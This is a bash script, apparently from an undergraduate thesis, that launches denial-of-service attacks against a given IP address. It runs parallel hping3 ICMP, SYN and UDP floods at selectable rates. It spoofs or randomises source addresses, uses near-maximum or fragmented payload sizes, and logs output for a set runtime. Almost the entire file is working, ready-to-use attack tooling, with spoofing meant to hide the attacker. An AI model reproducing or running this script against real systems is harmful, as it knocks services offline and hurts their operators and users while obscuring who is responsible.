#!/usr/bin/env bash

#created by Andre for his undergraduate-thesis
#for any further info, reach me out : hello.andre@email.com
#change the permission for this file if you run the program for the first time. use chmod +x or chmod 755.

SECONDS=0
target_host=
attack_mode="--flood"
source_mode="--spoof"
max_data_size=(1472 1460)
big_data_size=(65495 65507)
default_icmp_data=1472
default_syn_data=1460
default_udp_data=1472
icmp_data=
syn_data=
udp_data=
runtime=60
default=
data_size_val=
attack_mode_val=
source_mode_val=

center() {
	termwidth="$(tput cols)"
	padding="$(printf '%0.1s' .{1..500})"
  	printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

getICMP_TCPdata() {
	read -p "Specify the $1 data size : " number
	if ! [[ $number =~ ^[0-9]+$ ]]; then
		echo "error1"
		return 1
	else
		if [[ $number -ge 0 ]] && [[ $number -le 65495 ]]; then
			echo $number
	  		return 0
	  	else
	  		echo "error2"
			return 1
	  		#echo "For TCP and ICMP, data size must be in range 0 - 65495"
	  		#return 1
	  	fi
	fi
}

getUDPdata() {
	read -p "Specify the $1 data size : " number
	if ! [[ $number =~ ^[0-9]+$ ]]; then
		echo "error1"
		return 1
	else
		if [[ $number -ge 0 ]] && [[ $number -le 65507 ]]; then
	  		echo $number
	  		return 0
		else
		  	echo "error2"
			return 1
		  	#echo "For UDP, data size must be in range 0 - 65507"
		  	#return 1
		fi
	fi
}

displayHelpofPacketAmount() {
	echo "u100000		=> 10 packets for second"	#100k
	echo "u10000		=> 100 packets for second"	#10k
	echo "u1000		=> 1k packets for second"		#1k
	echo "e.g."
	echo "input : 100	=> 100 packets send for each second"
	echo "input : 2000	=> 2000 packets send for each second"
}

getPacketSize() {
	if ! [[ $1 =~ ^[0-9]+$ ]]; then
		echo "error1"
		return 1
	else
		if [[ $1 -ge 10 ]] && [[ $1 -lt 100 ]]; then
			echo 10000
			return 0
		elif [[ $1 -ge 100 ]] && [[ $1 -lt 1000 ]]; then
			echo 100
			return 0
		elif [[ $1 -ge 1000 ]] && [[ $1 -lt 10000 ]]; then
			echo 1
			return 0
		else
			echo "error2"
			return 1
		fi
	fi
}

trapCtrlC() {
	echo -e "\nProgram interrupted, ctrl-C pressed. Now exiting...."
	sleep 2
	#xdotool key ctrl+l
	clear>$(tty)
	exit 1
}

trap trapCtrlC SIGINT

## GET TIME INPUT BY USER
#time=${1?Error: no duration given $'\n'Try to run '"DoS attacks.sh 5"' $'\n'Where 5 is the duration (in secs)}

if [ $# -eq 1 ]; then
	while test $# -gt 0; do
		case "$1" in
			-h|--help)
				echo " "
				echo "usage ./deployAttacks.sh -t TARGET_HOST [option] [value]"
				echo "OR"
				echo "usage ./deployAttacks.sh --target-host=TARGET_HOST [option] [value]"
				echo " "
				echo "options : "
				echo "-h  --help		show this help"
				echo "-t  --target-host	Specify the target host"
				echo "-d  --default		enable default, default value can only set to 'true'."
				echo "-r  --runtime		specify time to take to run the program. (-r x for x second(s))"
				echo "-a  --attack-mode	Specify the attack mode to attack the target"
				echo "			'flood' mode to flood attack ASAP,"
				echo "			'fast' mode to attack with 0.5sec interval,"
				echo "			'normal' mode to attack with 1sec interval."
				echo "-m  --source-mode	Specify the IP address of yours."
				echo "			'spoof' source,"
				echo "			'random' source,"
				echo "			'normal' source. aka use your real IP address."
				echo "-s  --data-size		specify the data size"
				echo "			'max' default program data size without fragmented data,"
				echo "			'big' default program data size with fragmented data,"
				echo "			'manual' set your own data size. For manual option, set -s flag value to manual"
				echo "				-s manual OR --data-size=manual"
				echo "				and it'll prompt you to input the integer value."
				echo "-z --custom-mode	custom mode for andre for research purpose only."
				echo " "
				echo " "
				echo "If you want to run using default mode, try to run at least using '-d' or '--default' and '-t' or '--target-host' flag."
				echo "	e.g. ./deployAttacks.sh -t TARGET_HOST -d true"
				echo "	     ./deployAttacks.sh --target-host=TARGET_HOST --default=true"
				echo " "
				echo "For full help and description go to the man page"
				echo " "
				exit 0
				;;
			*)
				echo "error. flag options does not match."
				break
				;;
		esac
	done
elif [ $# -ge 4 ]; then
	echo "starting...."
	sleep 1
	while test $# -gt 0; do
		case "$1" in
			-t)
				shift
				if test $# -gt 0; then
					if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
						target_host=$1
						#echo $target_host
					else
						echo "[error (-t) option] invalid ip address."
						exit 1
						return
					fi
				else
					echo "[error (-t) option] No target host specified"
					exit 1
					return
				fi
				shift
				;;
			--target-host*)
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` != "" ]]; then
					if [[ `echo $1 | sed -e 's/^[^=]*=//g'` =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
						target_host=`echo $1 | sed -e 's/^[^=]*=//g'`
						#echo $target_host
					else
						echo "[error (--target-host) option] invalid ip address."
						exit 1
						return
					fi
				else
					echo "[error (--target-host) option] No target host specified"
					exit 1
					return
				fi
				shift
				;;
			-d)
				shift
				if test $# -gt 0; then
					if [ "$1" == "true" ]; then
						default=$1
						break
						#echo "Default Mode : Enabled"
					else
						echo "error. set default mode value to 'true'"
						exit 1
						return
					fi
				else
					echo "error. set default mode value to 'true'"
					exit 1
					return
				fi
				shift
				;;
			--default*)
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "true" ]]; then
					default=`echo $1 | sed -e 's/^[^=]*=//g'`
					break
					#echo "Default Mode : Enabled"
				else
					echo "error. set default mode value to 'true'"
					exit 1
					return
				fi
				shift
				;;
			-r)
				#re='^[0-9]+([.][0-9]+)?$'
				shift
				if test $# -gt 0; then
					if ! [[ $1 =~ ^[0-9]+([.][0-9]+)?$ ]] ; then
						echo "[error (-r) option] error. value must be a float value and non-zero value."
						exit 1
						return
					else
						 runtime=$1
						 #echo $runtime
					fi
				else
					echo "[error (-r) option] No runtime specified."
					exit 1
					return
				fi
				shift
				;;
			--runtime*)
				#re='^[0-9]+([.][0-9]+)?$'
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` != "" ]]; then
					if ! [[ `echo $1 | sed -e 's/^[^=]*=//g'` =~ ^[0-9]+([.][0-9]+)?$ ]]; then
						echo "[error (--runtime) option] error. value must be a float value and non-zero value."
						exit 1
						return
					else
						 runtime=`echo $1 | sed -e 's/^[^=]*=//g'`
						 #echo $runtime
					fi
				else
					echo "[error (--runtime) option] No runtime specified."
					exit 1
					return
				fi
				shift
				;;
			-a)
				shift
				if test $# -gt 0; then
					if [ "$1" == "flood" ]; then
						attack_mode_val=$1
						attack_mode="--flood"
					elif [ "$1" == "normal" ]; then
						attack_mode_val=$1
						attack_mode="-i 1"
					elif [ "$1" == "fast" ]; then
						attack_mode_val=$1
						attack_mode="-i u500000"
					else
						echo "[error (-a) option] error. set attack mode value to 'flood' or 'normal'"
						exit 1
						return
					fi			
				else
					echo "[error (-a) option] No attack mode specified."
					exit 1
					return
				fi
				shift
				;;
			--atack-mode*)
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` != "" ]]; then
					if [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "flood" ]]; then
						attack_mode_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						attack_mode="--flood"
					elif [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "normal" ]]; then
						attack_mode_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						attack_mode="-i 1"
					elif [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "fast" ]]; then
						attack_mode_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						attack_mode="-i u500000"
					else
						echo "[error (--attack-mode) option] error. set attack mode value to 'flood' or 'normal'"
						exit 1
						return
					fi
				else
					echo "[error (--attack-mode) option] No attack mode specified."
					exit 1
					return
				fi
				shift
				;;
			-m)
				shift
				if test $# -gt 0; then
					if [ "$1" == "spoof" ]; then
						source_mode_val=$1
						source_mode="--spoof"
					elif [ "$1" == "random" ]; then
						source_mode_val=$1
						source_mode="--rand-source"
					elif [ "$1" == "normal" ]; then
						source_mode_val=$1
					else
						echo "[error (-m) option] error. set source mode value to 'spoof' or 'random' or 'manual'"
						exit 1
						return
					fi			
				else
					echo "[error (-m) option] No source mode specified."
					exit 1
					return
				fi
				shift
				;;
			--source-mode*)
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` != "" ]]; then
					if [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "spoof" ]]; then
						source_mode_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						source_mode="--spoof"
					elif [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "random" ]]; then
						source_mode_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						source_mode="--rand-source"
					elif [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "normal" ]]; then
						source_mode_val=`echo $1 | sed -e 's/^[^=]*=//g'`
					else
						echo "[error (--source-mode) option] error. set source mode value to 'spoof' or 'random' or 'manual'"
						exit 1
						return
					fi			
				else
					echo "[error (--source-mode) option] No source mode specified."
					exit 1
					return
				fi
				shift
				;;
			-s)
				shift
				if test $# -gt 0; then
					if [ "$1" == "max" ]; then
						data_size_val=$1
						icmp_data=${max_data_size[0]}
						syn_data=${max_data_size[1]}
						udp_data=${max_data_size[0]}
					elif [ "$1" == "big" ]; then
						data_size_val=$1
						icmp_data=${big_data_size[0]}
						syn_data=${big_data_size[0]}
						udp_data=${big_data_size[1]}
					elif [ "$1" == "manual" ]; then
						data_size_val=$1
						until icmp_data=$(getICMP_TCPdata ICMP); do
							if [ "$icmp_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$icmp_data" == "error2" ]; then
								echo "For TCP and ICMP, data size must be in range 0 - 65495"
							fi
						done
						#echo $icmp_data
						until syn_data=$(getICMP_TCPdata TCP); do
							if [ "$syn_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$syn_data" == "error2" ]; then
								echo "For TCP and ICMP, data size must be in range 0 - 65495"
							fi
						done
						#echo $syn_data
						until udp_data=$(getUDPdata UDP); do
							if [ "$udp_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$udp_data" == "error2" ]; then
								echo "For UDP, data size must be in range 0 - 65507"
							fi
						done
						#echo $udp_data
					else
						echo "[error (-s) option] error. set data size value to 'max' or 'big' or 'manual'"
						exit 1
						return
					fi			
				else
					echo "[error (-s) option] No data size value specified."
					exit 1
					return
				fi
				shift
				;;
			--data-size*)
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` != "" ]]; then
					if [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "max" ]]; then
						data_size_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						icmp_data=${max_data_size[0]}
						syn_data=${max_data_size[1]}
						udp_data=${max_data_size[0]}
					elif [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "big" ]]; then
						data_size_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						icmp_data=${big_data_size[0]}
						syn_data=${big_data_size[0]}
						udp_data=${big_data_size[1]}
					elif [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "manual" ]]; then
						data_size_val=`echo $1 | sed -e 's/^[^=]*=//g'`
						until icmp_data=$(getICMP_TCPdata ICMP); do
							if [ "$icmp_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$icmp_data" == "error2" ]; then
								echo "For TCP and ICMP, data size must be in range 0 - 65495"
							fi
						done
						#echo $icmp_data
						until syn_data=$(getICMP_TCPdata TCP); do
							if [ "$syn_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$syn_data" == "error2" ]; then
								echo "For TCP and ICMP, data size must be in range 0 - 65495"
							fi
						done
						#echo $syn_data
						until udp_data=$(getUDPdata UDP); do
							if [ "$udp_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$udp_data" == "error2" ]; then
								echo "For UDP, data size must be in range 0 - 65507"
							fi
						done
						#echo $udp_data
					else
						echo "[error (--data-size) option] error. set data size value to 'max' or 'big' or 'manual'"
						exit 1
						return
					fi			
				else
					echo "[error (--data-size) option] No data size value specified."
					exit 1
					return
				fi
				shift
				;;
			-z)
				shift
				if test $# -gt 0; then
					if [ "$1" == "true" ]; then
						zee_mode=$1
						source_mode1="--spoof $target_host"
						source_mode2="--rand-source"
						echo ""		
						center "Packets amount to send"	
						echo ""			
						displayHelpofPacketAmount
						echo ""
						read -p "1) ICMP packets amount sent for every second : " packetSize
						until getInput=$(getPacketSize $packetSize); do
							if [ "$getInput" == "error1" ]; then
								echo "value must be an integer value."
								read -p "1) ICMP packets amount sent for every second : " packetSize
							elif [ "$getInput" == "error2" ]; then
								echo "neither the packet size is too small or too large, packets amount must be in range 10 - 9999"
								read -p "1) ICMP packets amount sent for every second : " packetSize
							fi
						done
						icmp_send_packet="-i u$((getInput*packetSize))"
						val_icmp_send_packet=$packetSize
						for ((i = 1 ; i <= 3 ; i++)); do
							read -p "$((i+1))) TCP($i) packets amount sent for every second : " packetSize
							until getInput=$(getPacketSize $packetSize); do
								if [ "$getInput" == "error1" ]; then
									echo "value must be an integer value."
									read -p "$((i+1))) TCP($i) packets amount sent for every second : " packetSize
								elif [ "$getInput" == "error2" ]; then
									echo "neither the packet size is too small or too large, packets amount must be in range 10 - 9999"
									read -p "$((i+1))) TCP($i) packets amount sent for every second : " packetSize
								fi
							done
							eval "tcp_send_packet$i='-i u$((getInput*packetSize))'"
							eval "val_tcp_send_packet$i=$packetSize"
						done
						for ((i = 1 ; i <= 3 ; i++)); do
							read -p "$((i+4))) UDP($i) packets amount sent for every second : " packetSize
							until getInput=$(getPacketSize $packetSize); do
								if [ "$getInput" == "error1" ]; then
									echo "value must be an integer value."
									read -p "$((i+4))) UDP($i) packets amount sent for every second : " packetSize
								elif [ "$getInput" == "error2" ]; then
									echo "neither the packet size is too small or too large, packets amount must be in range 10 - 9999"
									read -p "$((i+4))) UDP($i) packets amount sent for every second : " packetSize
								fi
							done
							eval "udp_send_packet$i='-i u$((getInput*packetSize))'"
							eval "val_udp_send_packet$i=$packetSize"
						done
						echo ""
						center "Data Size"
						echo ""
						for ((i = 1 ; i <= 3 ; i++)); do
							echo -e "$i) \c"; until getInput=$(getICMP_TCPdata ICMP); do
								if [ "$getInput" == "error1" ]; then
									echo "value must be an integer value."
								elif [ "$getInput" == "error2" ]; then
									echo "For TCP and ICMP, data size must be in range 0 - 65495"
								fi
							done
							eval "icmp_data$i=$getInput"
						done
						echo -e "4) \c"; until syn_data=$(getICMP_TCPdata TCP); do
							if [ "$syn_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$syn_data" == "error2" ]; then
								echo "For TCP and ICMP, data size must be in range 0 - 65495"
							fi
						done
						echo -e "5) \c"; until udp_data=$(getUDPdata UDP); do
							if [ "$udp_data" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$udp_data" == "error2" ]; then
								echo "For UDP, data size must be in range 0 - 65507"
							fi
						done
						break
					else
						echo "error. missing set value to this parameter."
						exit 1
						return
					fi
				else
					echo "error. missing set value to this parameter."
					exit 1
					return
				fi
				shift
				;;
			--custom-mode*)
				if [[ `echo $1 | sed -e 's/^[^=]*=//g'` == "true" ]]; then
					zee_mode=`echo $1 | sed -e 's/^[^=]*=//g'`
					source_mode1="--spoof $target_host"
					source_mode2="--rand-source"		
					echo ""		
					center "Packets amount to send"	
					echo ""			
					displayHelpofPacketAmount
					echo ""
					read -p "1) ICMP packets amount sent for every second : " packetSize
					until getInput=$(getPacketSize $packetSize); do
						if [ "$getInput" == "error1" ]; then
							echo "value must be an integer value."
							read -p "1) ICMP packets amount sent for every second : " packetSize
						elif [ "$getInput" == "error2" ]; then
							echo "neither the packet size is too small or too large, packets amount must be in range 10 - 9999"
							read -p "1) ICMP packets amount sent for every second : " packetSize
						fi
					done
					icmp_send_packet="-i u$((getInput*packetSize))"
					val_icmp_send_packet=$packetSize
					for ((i = 1 ; i <= 3 ; i++)); do
						read -p "$((i+1))) TCP($i) packets amount sent for every second : " packetSize
						until getInput=$(getPacketSize $packetSize); do
							if [ "$getInput" == "error1" ]; then
								echo "value must be an integer value."
								read -p "$((i+1))) TCP($i) packets amount sent for every second : " packetSize
							elif [ "$getInput" == "error2" ]; then
								echo "neither the packet size is too small or too large, packets amount must be in range 10 - 9999"
								read -p "$((i+1))) TCP($i) packets amount sent for every second : " packetSize
							fi
						done
						eval "tcp_send_packet$i='-i u$((getInput*packetSize))'"
						eval "val_tcp_send_packet$i=$packetSize"
					done
					for ((i = 1 ; i <= 3 ; i++)); do
						read -p "$((i+4))) UDP($i) packets amount sent for every second : " packetSize
						until getInput=$(getPacketSize $packetSize); do
							if [ "$getInput" == "error1" ]; then
								echo "value must be an integer value."
								read -p "$((i+4))) UDP($i) packets amount sent for every second : " packetSize
							elif [ "$getInput" == "error2" ]; then
								echo "neither the packet size is too small or too large, packets amount must be in range 10 - 9999"
								read -p "$((i+4))) UDP($i) packets amount sent for every second : " packetSize
							fi
						done
						eval "udp_send_packet$i='-i u$((getInput*packetSize))'"
						eval "val_udp_send_packet$i=$packetSize"
					done
					echo ""
					center "Data Size"
					echo ""
					for ((i = 1 ; i <= 3 ; i++)); do
						echo -e "$i) \c"; until getInput=$(getICMP_TCPdata ICMP); do
							if [ "$getInput" == "error1" ]; then
								echo "value must be an integer value."
							elif [ "$getInput" == "error2" ]; then
								echo "For TCP and ICMP, data size must be in range 0 - 65495"
							fi
						done
						eval "icmp_data$i=$getInput"
					done
					echo -e "4) \c"; until syn_data=$(getICMP_TCPdata TCP); do
						if [ "$syn_data" == "error1" ]; then
							echo "value must be an integer value."
						elif [ "$syn_data" == "error2" ]; then
							echo "For TCP and ICMP, data size must be in range 0 - 65495"
						fi
					done
					echo -e "5) \c"; until udp_data=$(getUDPdata UDP); do
						if [ "$udp_data" == "error1" ]; then
							echo "value must be an integer value."
						elif [ "$udp_data" == "error2" ]; then
							echo "For UDP, data size must be in range 0 - 65507"
						fi
					done
					break
				else
					echo "error. missing set value to this parameter."
					exit 1
					return
				fi
				shift
				;;
			*)
				echo "error. flag options does not match."
				break
				;;
		esac
	done

	clear>$(tty)
	
	echo " "
	echo "preparing..."
	current_dir=$(eval pwd)
	timestamps=`date "+%Y-%m-%d_%H:%M:%S"`
	DIRECTORY=$current_dir"/logDeployAttack"
	FILE=$DIRECTORY"/deploy_$timestamps.log"
		
	if [ ! -d "$DIRECTORY" ]; then
		echo "creating log file and log directory..."
		mkdir $DIRECTORY
		chmod 755 $DIRECTORY
		if [ ! -e $FILE ]; then
			touch $FILE
			chmod 755 $FILE
		fi
	else
		if [ ! -e $FILE ]; then
			echo "creating log file..."
			touch $FILE
			chmod 755 $FILE
		fi
	fi
	
	#echo "getting ready..."
	#sleep 1
	#xdotool key ctrl+l
	#sleep 1
	#echo " "
	echo "getting ready..."
	echo " "
	sleep 1
	clear>$(tty)
	printf "%`tput cols`s"|tr ' ' '#'
	center "Deploy DoS attacks"
	center "Andre"
	printf "%`tput cols`s"|tr ' ' '#'
				
	echo " "
	
	if [ $zee_mode ]; then
		echo "Custom Mode : Enabled"
		#ECHO TARGET HOST
		echo "Target Host  : $target_host"
		if [ "$target_host" == "" ]; then
			echo "Error. No target host specified while running attack.. exiting.."
			printf "%`tput cols`s"|tr ' ' '#'
			exit 1
			return
		fi
		#ECHO RUNNING TIME
		if [ $runtime -eq 0 ]; then
			echo "Running time : 60 sec(s)"
			runtime=60
		else
			echo "Running time : $runtime sec(s)"
		fi
		
		#ECHO PACKETS AMOUNT
		echo " "
		echo "Packet(s) amount to send"	
		echo "========================"
		echo "ICMP	: $val_icmp_send_packet packet(s)/sec"
		for ((i = 1 ; i <= 3 ; i++)); do
			eval echo "TCP\($i\)  : \$val_tcp_send_packet$i packet\(s\)/sec";
		done
		for ((i = 1 ; i <= 3 ; i++)); do
			eval echo "UDP\($i\)  : \$val_udp_send_packet$i packet\(s\)/sec";
		done
		
		#ECHO DATA SIZE
		echo " "
		echo "Data size"	
		echo "========="
		for ((i = 1 ; i <= 3 ; i++)); do
			eval echo "ICMP\($i\)  : \$icmp_data$i byte\(s\)";
		done 
		echo "TCP	: $syn_data byte(s)"
		echo "UDP	: $udp_data byte(s)"
		
		echo " "
		printf "%`tput cols`s"|tr ' ' '#'
		echo "Running..."
		
		#date "+%Y-%m-%d %T" >> $FILE
		timestamps=`date "+%Y-%m-%d %H:%M:%S"`
		echo "LOG CREATED ON $timestamps" >> $FILE
		echo " " >> $FILE
		
		##### ICMP Flood aka Ping Of Death
		## Run the command and get its PID and store the output of the command to the log
		hping3 $target_host -1 -V $icmp_send_packet $source_mode2 -d $icmp_data1 >> $FILE & PIDICMP1=$!
		hping3 $target_host -1 -V $icmp_send_packet $source_mode2 -d $icmp_data2 >> $FILE & PIDICMP2=$!
		hping3 $target_host -1 -V $icmp_send_packet $source_mode2 -d $icmp_data3 >> $FILE & PIDICMP3=$!
		
		##### SYN Flood
		## Run the command and get its PID and store the output of the command to the log
		hping3 $target_host -S -p 80 -V $tcp_send_packet1 $source_mode2 -d $syn_data >> $FILE & PIDTCP1=$!
		hping3 $target_host -S -p 80 -V $tcp_send_packet2 $source_mode2 -d $syn_data >> $FILE & PIDTCP2=$!
		hping3 $target_host -S -p 80 -V $tcp_send_packet3 $source_mode2 -d $syn_data >> $FILE & PIDTCP3=$!
		
		##### UDP Flood
		## Run the command and get its PID and store the output of the command to the log
		hping3 $target_host --udp -p 80 -V $udp_send_packet1 $source_mode2 -d $udp_data >> $FILE & PIDUDP1=$!
		hping3 $target_host --udp -p 80 -V $udp_send_packet2 $source_mode2 -d $udp_data >> $FILE & PIDUDP2=$!
		hping3 $target_host --udp -p 80 -V $udp_send_packet3 $source_mode2 -d $udp_data >> $FILE & PIDUDP3=$!
		
		# Let them work for you, enjoy a cup of coffee
		sleep $runtime
		# Kill it after time ran out
		kill $PIDICMP1 $PIDICMP2 $PIDICMP3 $PIDTCP1 $PIDTCP2 $PIDTCP3 $PIDUDP1 $PIDUDP2 $PIDUDP3
		
	else
		#ECHO DEFAULT MODE
		if [ $default ]; then
			echo "Default Mode : Enabled"
			attack_mode="--flood"
			attack_mode_val="flood"
			source_mode="--spoof $target_host"
			source_mode_val="spoof"
			icmp_data=1472
			syn_data=1460
			udp_data=1472
			data_size_val="max"
			runtime=60
		elif [[ "$attack_mode_val" == "" ]] || [[ "$source_mode_val" == "" ]] || [[ "$data_size_val" == "" ]] || [[ $runtime -eq 0 ]]; then
			echo "Default Mode : Disabled but some options use default"
		else
			echo "Default Mode : Disabled"
		fi
		
		#ECHO TARGET HOST
		echo "Target Host  : $target_host"
		if [ "$target_host" == "" ]; then
			echo "Error. No target host specified while running attack.. exiting.."
			printf "%`tput cols`s"|tr ' ' '#'
			exit 1
			return
		fi
		
		#ECHO ATTACK MODE
		if [ "$attack_mode_val" == "" ]; then
			echo "Attack Mode  : flood"
		else
			echo "Attack Mode  : $attack_mode_val"
		fi
		if [ "$attack_mode_val" == "" ]; then
			attack_mode="--flood"
		fi
		
		#ECHO SOURCE MODE
		if [ "$source_mode_val" == "" ]; then
			echo "Source Mode  : spoof"
		else
			echo "Source Mode  : $source_mode_val"
		fi
		if [[ "$source_mode_val" == "spoof" ]] || [[ "$source_mode_val" == "" ]]; then
			source_mode="--spoof $target_host"
		fi
		
		#ECHO DATA SIZE
		if [ "$data_size_val" == "" ]; then
			echo "Data Size    : big"
			icmp_data=1472
			syn_data=1460
			udp_data=1472
		else
			echo "Data Size    : $data_size_val"
		fi
		
		#ECHO RUNNING TIME
		if [ $runtime -eq 0 ]; then
			echo "Running time : 60 sec(s)"
			runtime=60
		else
			echo "Running time : $runtime sec(s)"
		fi
		
		echo " "
		printf "%`tput cols`s"|tr ' ' '#'
		echo "Running..."
		
		#date "+%Y-%m-%d %T" >> $FILE
		timestamps=`date "+%Y-%m-%d %H:%M:%S"`
		echo "LOG CREATED ON $timestamps" >> $FILE
		echo " " >> $FILE

		if [ "$source_mode_val" == "normal" ]; then
			##### ICMP Flood aka Ping Of Death
			## Run the command and get its PID and store the output of the command to the log
			hping3 $target_host -1 -V $attack_mode -d $icmp_data >> $FILE & PID1=$!
		
			##### SYN Flood
			## Run the command and get its PID and store the output of the command to the log
			hping3 $target_host -S -p 80 -V $attack_mode -d $syn_data >> $FILE & PID2=$!
		
			##### UDP Flood
			## Run the command and get its PID and store the output of the command to the log
			hping3 $target_host --udp -p 80 -V $attack_mode -d $udp_data >> $FILE & PID3=$!
		else
			##### ICMP Flood aka Ping Of Death
			## Run the command and get its PID and store the output of the command to the log
			hping3 $target_host -1 -V $attack_mode $source_mode -d $icmp_data >> $FILE & PID1=$!
		
			##### SYN Flood
			## Run the command and get its PID and store the output of the command to the log
			hping3 $target_host -S -p 80 -V $attack_mode $source_mode -d $syn_data >> $FILE & PID2=$!
		
			##### UDP Flood
			## Run the command and get its PID and store the output of the command to the log
			hping3 $target_host --udp -p 80 -V $attack_mode $source_mode -d $udp_data >> $FILE & PID3=$!
			
			# Let them work for you, enjoy a cup of coffee
			sleep $runtime
			# Kill it after time ran out
			kill $PID1 $PID2 $PID3
		fi
	fi

	echo "Finishing..."
	printf "%`tput cols`s"|tr ' ' '#'
	echo " "
	# Wait for more 3 secs to finishing
	sleep 3

	duration=$SECONDS
	echo -e "\nThe job done in $(($duration / 60)) minutes and $(($duration % 60)) seconds."
	echo -e "Log created.\n"
	
	echo " " >> $FILE
	printf "%0.s=" {1..100} >> $FILE
	echo " " >> $FILE
	echo " " >> $FILE
	
	printf "%`tput cols`s"|tr ' ' '#'
	center "DONE!"
	printf "%`tput cols`s"|tr ' ' '#'
	echo " "
else
	echo -e "\nError. No options flag were given or use at least 2 flags."
	echo "Try to run using -h or --help to see help and how to usage"
	echo "./deployAttacks.sh -h OR ./deployAttacks.sh --help"
	echo ""
fi
